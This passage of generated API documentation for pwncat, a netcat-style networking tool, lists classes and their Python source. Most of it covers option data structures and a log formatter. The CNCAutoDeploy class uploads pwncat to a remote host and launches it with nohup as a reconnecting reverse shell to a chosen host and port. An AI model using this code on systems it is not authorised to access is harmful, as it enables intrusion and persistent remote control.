    self.print_info(&#34;Creating tmpfile:&#34;, False, True)
    for response in self.__frecv():
        if response:
            tmpfile = response.rstrip()
            self.print_info(&#34;Creating tmpfile: {}&#34;.format(tmpfile), True, True)
            return tmpfile

    self.print_info(&#34;Failed to create tmpfile&#34;, True, True)
    return None</code></pre>
</details>
</dd>
<dt id="pwncat.CNC.print_info"><code class="name flex">
<span>def <span class="ident">print_info</span></span>(<span>self, message=None, newline=True, erase=False)</span>
</code></dt>
<dd>
<div class="desc"><p>Print a message to the local screen to inform the user.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>message</code></strong> :&ensp;<code>str</code></dt>
<dd>The message to print.</dd>
<dt><strong><code>newline</code></strong> :&ensp;<code>bool</code></dt>
<dd>Add a newline?</dd>
<dt><strong><code>erase</code></strong> :&ensp;<code>bool</code></dt>
<dd>Erase previously printed text on the same line.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def print_info(self, message=None, newline=True, erase=False):
    # type: (Optional[str], bool, bool) -&gt; None
    &#34;&#34;&#34;Print a message to the local screen to inform the user.

    Args:
        message (str): The message to print.
        newline (bool): Add a newline?
        erase (bool): Erase previously printed text on the same line.
    &#34;&#34;&#34;
    end = &#34;\n&#34; if newline else &#34;&#34;
    prefix = &#34;{}[PWNCAT CnC]{} &#34;.format(self.__COLORS[&#34;yellow&#34;], self.__COLORS[&#34;reset&#34;])
    if message is None:
        message = &#34;&#34;
        prefix = &#34;&#34;

    if erase:
        print(&#34;\r&#34; * 1024 + &#34;{}{}&#34;.format(prefix, message), end=end)
        sys.stdout.flush()
    else:
        print(&#34;{}{}&#34;.format(prefix, message), end=end)
        sys.stdout.flush()</code></pre>
</details>
</dd>
<dt id="pwncat.CNC.remote_command"><code class="name flex">
<span>def <span class="ident">remote_command</span></span>(<span>self, command)</span>
</code></dt>
<dd>
<div class="desc"><p>Run remote command with correct linefeeds.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>command</code></strong> :&ensp;<code>str</code></dt>
<dd>The command to execute on the remote end.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def remote_command(self, command):
    # type: (str) -&gt; None
    &#34;&#34;&#34;Run remote command with correct linefeeds.

    Args:
        command (str): The command to execute on the remote end.
    &#34;&#34;&#34;
    # TODO: determine remote host line feeds and set accordingly.
    self.__fsend(command + &#34;\n&#34;)</code></pre>
</details>
</dd>
<dt id="pwncat.CNC.upload"><code class="name flex">
<span>def <span class="ident">upload</span></span>(<span>self, lpath, rpath)</span>
</code></dt>
<dd>
<div class="desc"><p>OS-independent upload of a local file to a remote path.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>lpath</code></strong> :&ensp;<code>str</code></dt>
<dd>Local path of the file.</dd>
<dt><strong><code>rpath</code></strong> :&ensp;<code>str</code></dt>
<dd>Remote path, where to upload the base64 encoded file.</dd>
</dl>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>bool</code></dt>
<dd>Returns <code>True</code> on success and <code>False</code> on failure.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def upload(self, lpath, rpath):
    # type: (str, str) -&gt; bool
    &#34;&#34;&#34;OS-independent upload of a local file to a remote path.

    Args:
        lpath (str): Local path of the file.
        rpath (str): Remote path, where to upload the base64 encoded file.

    Returns:
        bool: Returns `True` on success and `False` on failure.
    &#34;&#34;&#34;
    assert self.__python is not None
    assert self.__py3 is not None

    rpath_b64 = self.create_remote_tmpfile()
    if rpath_b64 is None:
        return False
    if not self.__upload_file_base_64_encoded(lpath, rpath_b64):
        return False
    if not self.__remote_base64_decode(rpath_b64, rpath):
        return False
    return True</code></pre>
</details>
</dd>
</dl>
</dd>
<dt id="pwncat.CNCAutoDeploy"><code class="flex name class">
<span>class <span class="ident">CNCAutoDeploy</span></span>
<span>(</span><span>enc, send, recv, cmd, host, port)</span>
</code></dt>
<dd>
<div class="desc"><p>Command&amp;Control pwncat auto deployment class.</p>
<p>Instantiate Command and Control class.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>enc</code></strong> :&ensp;<code><a title="pwncat.StringEncoder" href="#pwncat.StringEncoder">StringEncoder</a></code></dt>
<dd>Instance of StringEncoder (Python2/3 str/byte compat).</dd>
<dt><strong><code>fsend</code></strong> :&ensp;<code>func</code></dt>
<dd>Socket send function.</dd>
<dt><strong><code>frcev</code></strong> :&ensp;<code>func</code></dt>
<dd>Socket receive generator function.</dd>
</dl>
<h2 id="raises">Raises</h2>
<dl>
<dt><code>FileNotFoundError</code></dt>
<dd>if remote Python binary path is not found.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class CNCAutoDeploy(CNC):
    &#34;&#34;&#34;Command&amp;Control pwncat auto deployment class.&#34;&#34;&#34;

    def __init__(
        self,
        enc,  # type: StringEncoder
        send,  # type: Callable[[str], None]
        recv,  # type: Callable[[], Iterator[str]]
        cmd,  # type: str
        host,  # type: str
        port,  # type: str
    ):
        # type: (...) -&gt; None
        try:
            super(CNCAutoDeploy, self).__init__(enc, send, recv)
        except FileNotFoundError:
            return

        local_path = os.path.abspath(__file__)
        remote_path = self.create_remote_tmpfile()
        if remote_path is None:
            return
        if not self.upload(local_path, remote_path):
            return
        # TODO: Ensure pwncat stays running
        self.__start_pwncat(remote_path, cmd, host, port)
        return

    def __start_pwncat(self, remote_path, binary, host, port):
        # type: (str, str, str, str) -&gt; None
        command = []
        command.append(&#34;nohup&#34;)
        command.append(self.python)
        command.append(remote_path)
        command.append(&#34;--exec {}&#34;.format(binary))
        command.append(&#34;--reconn&#34;)
        command.append(&#34;--reconn-wait 1&#34;)
        command.append(host)
        command.append(port)
        command.append(&#34;&amp;&#34;)
        data = &#34; &#34;.join(command)
        print(&#34;Starting pwncat rev shell: {}&#34;.format(data))
        self.remote_command(data)</code></pre>
</details>
<h3>Ancestors</h3>
<ul class="hlist">
<li><a title="pwncat.CNC" href="#pwncat.CNC">CNC</a></li>
</ul>
<h3>Inherited members</h3>
<ul class="hlist">
<li><code><b><a title="pwncat.CNC" href="#pwncat.CNC">CNC</a></b></code>:
<ul class="hlist">
<li><code><a title="pwncat.CNC.create_remote_tmpfile" href="#pwncat.CNC.create_remote_tmpfile">create_remote_tmpfile</a></code></li>
<li><code><a title="pwncat.CNC.print_info" href="#pwncat.CNC.print_info">print_info</a></code></li>
<li><code><a title="pwncat.CNC.py3" href="#pwncat.CNC.py3">py3</a></code></li>
<li><code><a title="pwncat.CNC.python" href="#pwncat.CNC.python">python</a></code></li>
<li><code><a title="pwncat.CNC.remote_command" href="#pwncat.CNC.remote_command">remote_command</a></code></li>
<li><code><a title="pwncat.CNC.upload" href="#pwncat.CNC.upload">upload</a></code></li>
</ul>
</li>
</ul>
</dd>
<dt id="pwncat.ColoredLogFormatter"><code class="flex name class">
<span>class <span class="ident">ColoredLogFormatter</span></span>
<span>(</span><span>color, loglevel)</span>
</code></dt>
<dd>
<div class="desc"><p>Custom log formatter which adds different details and color support.</p>
<p>Instantiate ColoredLogFormatter class.</p>
<h2 id="args">Args</h2>
<dl>
<dt><strong><code>color</code></strong> :&ensp;<code>str</code></dt>
<dd>Either be <code>alway</code>, <code>never</code> or <code>auto</code>.</dd>
<dt><strong><code>loglevel</code></strong> :&ensp;<code>int</code></dt>
<dd>Current desired log level.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class ColoredLogFormatter(logging.Formatter):
    &#34;&#34;&#34;Custom log formatter which adds different details and color support.&#34;&#34;&#34;

    COLORS = {
        logging.CRITICAL: &#34;\x1b[31;1m&#34;,  # bold red
        logging.ERROR: &#34;\x1b[31;21m&#34;,  # red
        logging.WARNING: &#34;\x1b[33;21m&#34;,  # yellow
        logging.INFO: &#34;\x1b[32;21m&#34;,  # green
        logging.DEBUG: &#34;\x1b[30;21m&#34;,  # gray
    }
    COLOR_DEF = COLORS[logging.DEBUG]
    COLOR_RST = &#34;\x1b[0m&#34;

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, color, loglevel):
        # type: (str, int) -&gt; None
        &#34;&#34;&#34;Instantiate ColoredLogFormatter class.

        Args:
            color (str):  Either be `alway`, `never` or `auto`.
            loglevel (int): Current desired log level.
        &#34;&#34;&#34;
        super(ColoredLogFormatter, self).__init__()
        self.color = color
        self.loglevel = loglevel
        self.tty = sys.stderr.isatty()

    # --------------------------------------------------------------------------
    # Public Functions
    # --------------------------------------------------------------------------
    def format(self, record):
        # type: (logging.LogRecord) -&gt; str
        &#34;&#34;&#34;Apply custom formatting to log message.&#34;&#34;&#34;
        log_fmt = self.__get_format()
        log_fmt = self.__colorize(record.levelno, log_fmt)
        formatter = logging.Formatter(log_fmt)
        return formatter.format(record)

    # --------------------------------------------------------------------------
    # Private Functions
    # --------------------------------------------------------------------------
    def __get_format(self):
        # type: () -&gt; str
        &#34;&#34;&#34;Return format string based on currently applied log level.&#34;&#34;&#34;
        # In debug logging we add slightly more info to all formats
        if self.loglevel == logging.DEBUG:
            return &#34;%(levelname)s [%(threadName)s]: %(message)s&#34;
        # In lower than debug logging we will add even more info to all log formats
        if self.loglevel &lt; logging.DEBUG:
            return (
                &#34;%(asctime)s %(levelname)s [%(threadName)s] %(lineno)d:%(funcName)s(): %(message)s&#34;
            )
        # By default, we will only add basic info
        return &#34;%(levelname)s: %(message)s&#34;

    def __colorize(self, level, fmt):
        # type: (int, str) -&gt; str
        &#34;&#34;&#34;Colorize a log message based on its level.&#34;&#34;&#34;
        if self.color == &#34;never&#34;:
            return fmt

        # If stderr is redirected to a file or we&#39;re running on windows, do not do colorize
        if self.color == &#34;auto&#34; and (not self.tty or os.name == &#34;nt&#34;):
            return fmt

        return self.COLORS.get(level, self.COLOR_DEF) + fmt + self.COLOR_RST</code></pre>
</details>
<h3>Ancestors</h3>
<ul class="hlist">
<li>logging.Formatter</li>
</ul>
<h3>Class variables</h3>
<dl>
<dt id="pwncat.ColoredLogFormatter.COLORS"><code class="name">var <span class="ident">COLORS</span></code></dt>
<dd>
<div class="desc"></div>
</dd>
<dt id="pwncat.ColoredLogFormatter.COLOR_DEF"><code class="name">var <span class="ident">COLOR_DEF</span></code></dt>
<dd>
<div class="desc"></div>
</dd>
<dt id="pwncat.ColoredLogFormatter.COLOR_RST"><code class="name">var <span class="ident">COLOR_RST</span></code></dt>
<dd>
<div class="desc"></div>
</dd>
</dl>
<h3>Methods</h3>
<dl>
<dt id="pwncat.ColoredLogFormatter.format"><code class="name flex">
<span>def <span class="ident">format</span></span>(<span>self, record)</span>
</code></dt>
<dd>
<div class="desc"><p>Apply custom formatting to log message.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def format(self, record):
    # type: (logging.LogRecord) -&gt; str
    &#34;&#34;&#34;Apply custom formatting to log message.&#34;&#34;&#34;
    log_fmt = self.__get_format()
    log_fmt = self.__colorize(record.levelno, log_fmt)
    formatter = logging.Formatter(log_fmt)
    return formatter.format(record)</code></pre>
</details>
</dd>
</dl>
</dd>
<dt id="pwncat.DsIOCommand"><code class="flex name class">
<span>class <span class="ident">DsIOCommand</span></span>
<span>(</span><span>enc, executable, bufsize)</span>
</code></dt>
<dd>
<div class="desc"><p>A type-safe data structure for IOCommand options.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class DsIOCommand(object):
    &#34;&#34;&#34;A type-safe data structure for IOCommand options.&#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def enc(self):
        # type: () -&gt; StringEncoder
        &#34;&#34;&#34;`StringEncoder`: Instance of StringEncoder.&#34;&#34;&#34;
        return self.__enc

    @property
    def executable(self):
        # type: () -&gt; str
        &#34;&#34;&#34;`srt`: Name or path of executable to run (e.g.: `/bin/bash`).&#34;&#34;&#34;
        return self.__executable

    @property
    def bufsize(self):
        # type: () -&gt; int
        &#34;&#34;&#34;`int`: `subprocess.Popen` bufsize.

        https://docs.python.org/3/library/subprocess.html#popen-constructor
        0 means unbuffered (read and write are one system call and can return short)
        1 means line buffered (only usable if universal_newlines=True i.e., in a text mode)
        any other positive value means use a buffer of approximately that size
        negative bufsize (the default) means system default of io.DEFAULT_BUFFER_SIZE will be used.
        &#34;&#34;&#34;
        return self.__bufsize

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, enc, executable, bufsize):
        # type: (StringEncoder, str, int) -&gt; None
        self.__enc = enc
        self.__executable = executable
        self.__bufsize = bufsize</code></pre>
</details>
<h3>Instance variables</h3>
<dl>
<dt id="pwncat.DsIOCommand.bufsize"><code class="name">var <span class="ident">bufsize</span></code></dt>
<dd>
<div class="desc"><p><code>int</code>: <code>subprocess.Popen</code> bufsize.</p>
<p><a href="https://docs.python.org/3/library/subprocess.html#popen-constructor">https://docs.python.org/3/library/subprocess.html#popen-constructor</a>
0 means unbuffered (read and write are one system call and can return short)
1 means line buffered (only usable if universal_newlines=True i.e., in a text mode)
any other positive value means use a buffer of approximately that size
negative bufsize (the default) means system default of io.DEFAULT_BUFFER_SIZE will be used.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def bufsize(self):
    # type: () -&gt; int
    &#34;&#34;&#34;`int`: `subprocess.Popen` bufsize.

    https://docs.python.org/3/library/subprocess.html#popen-constructor
    0 means unbuffered (read and write are one system call and can return short)
    1 means line buffered (only usable if universal_newlines=True i.e., in a text mode)
    any other positive value means use a buffer of approximately that size
    negative bufsize (the default) means system default of io.DEFAULT_BUFFER_SIZE will be used.
    &#34;&#34;&#34;
    return self.__bufsize</code></pre>
</details>
</dd>
<dt id="pwncat.DsIOCommand.enc"><code class="name">var <span class="ident">enc</span></code></dt>
<dd>
<div class="desc"><p><code><a title="pwncat.StringEncoder" href="#pwncat.StringEncoder">StringEncoder</a></code>: Instance of StringEncoder.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def enc(self):
    # type: () -&gt; StringEncoder
    &#34;&#34;&#34;`StringEncoder`: Instance of StringEncoder.&#34;&#34;&#34;
    return self.__enc</code></pre>
</details>
</dd>
<dt id="pwncat.DsIOCommand.executable"><code class="name">var <span class="ident">executable</span></code></dt>
<dd>
<div class="desc"><p><code>srt</code>: Name or path of executable to run (e.g.: <code>/bin/bash</code>).</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def executable(self):
    # type: () -&gt; str
    &#34;&#34;&#34;`srt`: Name or path of executable to run (e.g.: `/bin/bash`).&#34;&#34;&#34;
    return self.__executable</code></pre>
</details>
</dd>
</dl>
</dd>
<dt id="pwncat.DsIONetworkCli"><code class="flex name class">
<span>class <span class="ident">DsIONetworkCli</span></span>
<span>(</span><span>reconn, reconn_wait, reconn_robin)</span>
</code></dt>
<dd>
<div class="desc"><p>A type-safe data structure for IONetwork client options.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class DsIONetworkCli(object):
    &#34;&#34;&#34;A type-safe data structure for IONetwork client options.&#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def reconn(self):
        # type: () -&gt; int
        &#34;&#34;&#34;`int`: If connection fails, retry endless (if negative) or x many times.&#34;&#34;&#34;
        return self.__reconn

    @reconn.setter
    def reconn(self, value):
        # type: (int) -&gt; None
        assert type(value) is int, type(value)
        self.__reconn = value

    @property
    def reconn_wait(self):
        # type: () -&gt; float
        &#34;&#34;&#34;`float`: Wait time between re-connections in seconds.&#34;&#34;&#34;
        return self.__reconn_wait

    @reconn_wait.setter
    def reconn_wait(self, value):
        # type: (float) -&gt; None
        assert type(value) is float, type(value)
        self.__reconn_wait = value

    @property
    def reconn_robin(self):
        # type: () -&gt; List[int]
        &#34;&#34;&#34;`[int]`: List of alternating re-connection ports.&#34;&#34;&#34;
        return self.__reconn_robin

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, reconn, reconn_wait, reconn_robin):
        # type: (int, float, List[int]) -&gt; None
        assert type(reconn) is int, type(reconn)
        assert type(reconn_wait) is float, type(reconn_wait)
        assert type(reconn_robin) is list, type(reconn_robin)
        for i in reconn_robin:
            assert type(i) is int, type(i)
        self.__reconn = reconn
        self.__reconn_wait = reconn_wait
        self.__reconn_robin = reconn_robin</code></pre>
</details>
<h3>Instance variables</h3>
<dl>
<dt id="pwncat.DsIONetworkCli.reconn"><code class="name">var <span class="ident">reconn</span></code></dt>
<dd>
<div class="desc"><p><code>int</code>: If connection fails, retry endless (if negative) or x many times.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def reconn(self):
    # type: () -&gt; int
    &#34;&#34;&#34;`int`: If connection fails, retry endless (if negative) or x many times.&#34;&#34;&#34;
    return self.__reconn</code></pre>
</details>
</dd>
<dt id="pwncat.DsIONetworkCli.reconn_robin"><code class="name">var <span class="ident">reconn_robin</span></code></dt>
<dd>
<div class="desc"><p><code>[int]</code>: List of alternating re-connection ports.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def reconn_robin(self):
    # type: () -&gt; List[int]
    &#34;&#34;&#34;`[int]`: List of alternating re-connection ports.&#34;&#34;&#34;
    return self.__reconn_robin</code></pre>
</details>
</dd>
<dt id="pwncat.DsIONetworkCli.reconn_wait"><code class="name">var <span class="ident">reconn_wait</span></code></dt>
<dd>
<div class="desc"><p><code>float</code>: Wait time between re-connections in seconds.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def reconn_wait(self):
    # type: () -&gt; float
    &#34;&#34;&#34;`float`: Wait time between re-connections in seconds.&#34;&#34;&#34;
    return self.__reconn_wait</code></pre>
</details>
</dd>
</dl>
</dd>
<dt id="pwncat.DsIONetworkSock"><code class="flex name class">
<span>class <span class="ident">DsIONetworkSock</span></span>
<span>(</span><span>bufsize, backlog, recv_timeout, recv_timeout_retry, nodns, ipv6, udp, ip_tos, info)</span>
</code></dt>
<dd>
<div class="desc"><p>A type-safe data structure for IONetwork socket options.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class DsIONetworkSock(DsSock):
    &#34;&#34;&#34;A type-safe data structure for IONetwork socket options.&#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def recv_timeout_retry(self):
        # type: () -&gt; int
        &#34;&#34;&#34;`int`: How many times to retry receiving if stop signal was raised.&#34;&#34;&#34;
        return self.__recv_timeout_retry

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(
        self,
        bufsize,  # type: int
        backlog,  # type: int
        recv_timeout,  # type: Optional[float]
        recv_timeout_retry,  # type: int
        nodns,  # type: bool
        ipv6,  # type: bool
        udp,  # type: bool
        ip_tos,  # type: Optional[str]
        info,  # type: str
    ):
        # type: (...) -&gt; None
        assert type(recv_timeout_retry) is int, type(recv_timeout_retry)
        self.__recv_timeout_retry = recv_timeout_retry
        super(DsIONetworkSock, self).__init__(
            bufsize, backlog, recv_timeout, nodns, ipv6, udp, ip_tos, info
        )</code></pre>
</details>
<h3>Ancestors</h3>
<ul class="hlist">
<li><a title="pwncat.DsSock" href="#pwncat.DsSock">DsSock</a></li>
</ul>
<h3>Instance variables</h3>
<dl>
<dt id="pwncat.DsIONetworkSock.recv_timeout_retry"><code class="name">var <span class="ident">recv_timeout_retry</span></code></dt>
<dd>
<div class="desc"><p><code>int</code>: How many times to retry receiving if stop signal was raised.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def recv_timeout_retry(self):
    # type: () -&gt; int
    &#34;&#34;&#34;`int`: How many times to retry receiving if stop signal was raised.&#34;&#34;&#34;
    return self.__recv_timeout_retry</code></pre>
</details>
</dd>
</dl>
<h3>Inherited members</h3>
<ul class="hlist">
<li><code><b><a title="pwncat.DsSock" href="#pwncat.DsSock">DsSock</a></b></code>:
<ul class="hlist">
<li><code><a title="pwncat.DsSock.backlog" href="#pwncat.DsSock.backlog">backlog</a></code></li>
<li><code><a title="pwncat.DsSock.bufsize" href="#pwncat.DsSock.bufsize">bufsize</a></code></li>
<li><code><a title="pwncat.DsSock.info" href="#pwncat.DsSock.info">info</a></code></li>
<li><code><a title="pwncat.DsSock.ip_tos" href="#pwncat.DsSock.ip_tos">ip_tos</a></code></li>
<li><code><a title="pwncat.DsSock.ipv6" href="#pwncat.DsSock.ipv6">ipv6</a></code></li>
<li><code><a title="pwncat.DsSock.nodns" href="#pwncat.DsSock.nodns">nodns</a></code></li>
<li><code><a title="pwncat.DsSock.recv_timeout" href="#pwncat.DsSock.recv_timeout">recv_timeout</a></code></li>
<li><code><a title="pwncat.DsSock.udp" href="#pwncat.DsSock.udp">udp</a></code></li>
</ul>
</li>
</ul>
</dd>
<dt id="pwncat.DsIONetworkSrv"><code class="flex name class">
<span>class <span class="ident">DsIONetworkSrv</span></span>
<span>(</span><span>keep_open, rebind, rebind_wait, rebind_robin)</span>
</code></dt>
<dd>
<div class="desc"><p>A type-safe data structure for IONetwork server options.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class DsIONetworkSrv(object):
    &#34;&#34;&#34;A type-safe data structure for IONetwork server options.&#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def keep_open(self):
        # type: () -&gt; bool
        &#34;&#34;&#34;`bool`: Accept new clients if one has disconnected.&#34;&#34;&#34;
        return bool(self.__keep_open)

    @keep_open.setter
    def keep_open(self, value):
        # type: (bool) -&gt; None
        &#34;&#34;&#34;Change keep_open value.&#34;&#34;&#34;
        assert type(value) is bool, type(value)
        self.__keep_open = value

    @property
    def rebind(self):
        # type: () -&gt; int
        &#34;&#34;&#34;`int`: If binding fails, retry endless (if negative) or x many times.&#34;&#34;&#34;
        return self.__rebind

    @property
    def rebind_wait(self):
        # type: () -&gt; float
        &#34;&#34;&#34;`float`: Wait time between rebinds in seconds.&#34;&#34;&#34;
        return self.__rebind_wait

    @property
    def rebind_robin(self):
        # type: () -&gt; List[int]
        &#34;&#34;&#34;`[int]`: List of alternating rebind ports.&#34;&#34;&#34;
        return self.__rebind_robin

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, keep_open, rebind, rebind_wait, rebind_robin):
        # type: (bool, int, float, List[int]) -&gt; None
        assert type(keep_open) is bool, type(keep_open)
        assert type(rebind) is int, type(rebind)
        assert type(rebind_wait) is float, type(rebind_wait)
        assert type(rebind_robin) is list, type(rebind_robin)
        for i in rebind_robin:
            assert type(i) is int, type(i)
        self.keep_open = keep_open
        self.__rebind = rebind
        self.__rebind_wait = rebind_wait
        self.__rebind_robin = rebind_robin</code></pre>
</details>
<h3>Instance variables</h3>
<dl>
<dt id="pwncat.DsIONetworkSrv.keep_open"><code class="name">var <span class="ident">keep_open</span></code></dt>
<dd>
<div class="desc"><p><code>bool</code>: Accept new clients if one has disconnected.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def keep_open(self):
    # type: () -&gt; bool
    &#34;&#34;&#34;`bool`: Accept new clients if one has disconnected.&#34;&#34;&#34;
    return bool(self.__keep_open)</code></pre>
</details>
</dd>
<dt id="pwncat.DsIONetworkSrv.rebind"><code class="name">var <span class="ident">rebind</span></code></dt>
<dd>
<div class="desc"><p><code>int</code>: If binding fails, retry endless (if negative) or x many times.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def rebind(self):
    # type: () -&gt; int
    &#34;&#34;&#34;`int`: If binding fails, retry endless (if negative) or x many times.&#34;&#34;&#34;
    return self.__rebind</code></pre>
</details>
</dd>
<dt id="pwncat.DsIONetworkSrv.rebind_robin"><code class="name">var <span class="ident">rebind_robin</span></code></dt>
<dd>
<div class="desc"><p><code>[int]</code>: List of alternating rebind ports.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def rebind_robin(self):
    # type: () -&gt; List[int]
    &#34;&#34;&#34;`[int]`: List of alternating rebind ports.&#34;&#34;&#34;
    return self.__rebind_robin</code></pre>
</details>
</dd>
<dt id="pwncat.DsIONetworkSrv.rebind_wait"><code class="name">var <span class="ident">rebind_wait</span></code></dt>
<dd>
<div class="desc"><p><code>float</code>: Wait time between rebinds in seconds.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def rebind_wait(self):
    # type: () -&gt; float
    &#34;&#34;&#34;`float`: Wait time between rebinds in seconds.&#34;&#34;&#34;
    return self.__rebind_wait</code></pre>
</details>
</dd>
</dl>
</dd>
<dt id="pwncat.DsIOStdinStdout"><code class="flex name class">
<span>class <span class="ident">DsIOStdinStdout</span></span>
<span>(</span><span>encoder, input_timeout)</span>
</code></dt>
<dd>
<div class="desc"><p>A type-safe data structure for IOStdinStdout options.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class DsIOStdinStdout(object):
    &#34;&#34;&#34;A type-safe data structure for IOStdinStdout options.&#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def enc(self):
        # type: () -&gt; StringEncoder
        &#34;&#34;&#34;`StringEncoder`: String encoder instance.&#34;&#34;&#34;
        return self.__enc

    @property
    def input_timeout(self):
        # type: () -&gt; Optional[float]
        &#34;&#34;&#34;`float`: Input timeout in seconds for non-blocking read or `None` for blocking.&#34;&#34;&#34;
        return self.__input_timeout

    # --------------------------------------------------------------------------
    # Constructor
    # --------------------------------------------------------------------------
    def __init__(self, encoder, input_timeout):
        # type: (StringEncoder, Optional[float]) -&gt; None
        super(DsIOStdinStdout, self).__init__()
        self.__enc = encoder
        self.__input_timeout = input_timeout</code></pre>
</details>
<h3>Instance variables</h3>
<dl>
<dt id="pwncat.DsIOStdinStdout.enc"><code class="name">var <span class="ident">enc</span></code></dt>
<dd>
<div class="desc"><p><code><a title="pwncat.StringEncoder" href="#pwncat.StringEncoder">StringEncoder</a></code>: String encoder instance.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def enc(self):
    # type: () -&gt; StringEncoder
    &#34;&#34;&#34;`StringEncoder`: String encoder instance.&#34;&#34;&#34;
    return self.__enc</code></pre>
</details>
</dd>
<dt id="pwncat.DsIOStdinStdout.input_timeout"><code class="name">var <span class="ident">input_timeout</span></code></dt>
<dd>
<div class="desc"><p><code>float</code>: Input timeout in seconds for non-blocking read or <code>None</code> for blocking.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def input_timeout(self):
    # type: () -&gt; Optional[float]
    &#34;&#34;&#34;`float`: Input timeout in seconds for non-blocking read or `None` for blocking.&#34;&#34;&#34;
    return self.__input_timeout</code></pre>
</details>
</dd>
</dl>
</dd>
<dt id="pwncat.DsRunnerAction"><code class="flex name class">
<span>class <span class="ident">DsRunnerAction</span></span>
<span>(</span><span>producer, consumer, interrupts, transformers, code)</span>
</code></dt>
<dd>
<div class="desc"><p>A type-safe data structure for Action functions for the Runner class.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class DsRunnerAction(object):
    &#34;&#34;&#34;A type-safe data structure for Action functions for the Runner class.&#34;&#34;&#34;

    # --------------------------------------------------------------------------
    # Properties
    # --------------------------------------------------------------------------
    @property
    def producer(self):
        # type: () -&gt; Callable[[], Iterator[str]]
        &#34;&#34;&#34;`IO.producer`: Data producer function.&#34;&#34;&#34;
        return self.__producer

    @property
    def consumer(self):
        # type: () -&gt; Callable[[str], None]
        &#34;&#34;&#34;`IO.consumer`: Data consumer function.&#34;&#34;&#34;
        return self.__consumer

    @property
    def interrupts(self):
        # type: () -&gt; List[Callable[[], None]]
        &#34;&#34;&#34;`[List[Callable[[], None]]]`: List of interrupt functions for the producer/consumer.&#34;&#34;&#34;
        return self.__interrupts

    @property
    def transformers(self):
        # type: () -&gt; List[Transform]
        &#34;&#34;&#34;`[Transform.transformer]`: List of transformer functions applied before consumer.&#34;&#34;&#34;
        return self.__transformers

    @property
    def code(self):
        # type: () -&gt; Optional[Union[str, bytes, CodeType]]
        &#34;&#34;&#34;`ast.AST`: custom Python code which provides a `transform(data, pse) -&gt; str` function.&#34;&#34;&#34;
        return self.__code

    # --------------------------------------------------------------------------
    # Contrcutor
    # --------------------------------------------------------------------------
    def __init__(
        self,
        producer,  # type: Callable[[], Iterator[str]]
        consumer,  # type: Callable[[str], None]
        interrupts,  # type: List[Callable[[], None]]
        transformers,  # type: List[Transform]
        code,  # type: Optional[Union[str, bytes, CodeType]]
    ):
        # type: (...) -&gt; None
        self.__producer = producer
        self.__consumer = consumer
        self.__interrupts = interrupts
        self.__transformers = transformers
        self.__code = code</code></pre>
</details>
<h3>Instance variables</h3>
<dl>
<dt id="pwncat.DsRunnerAction.code"><code class="name">var <span class="ident">code</span></code></dt>
<dd>
<div class="desc"><p><code>ast.AST</code>: custom Python code which provides a <code>transform(data, pse) -&gt; str</code> function.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">@property
def code(self):
    # type: () -&gt; Optional[Union[str, bytes, CodeType]]
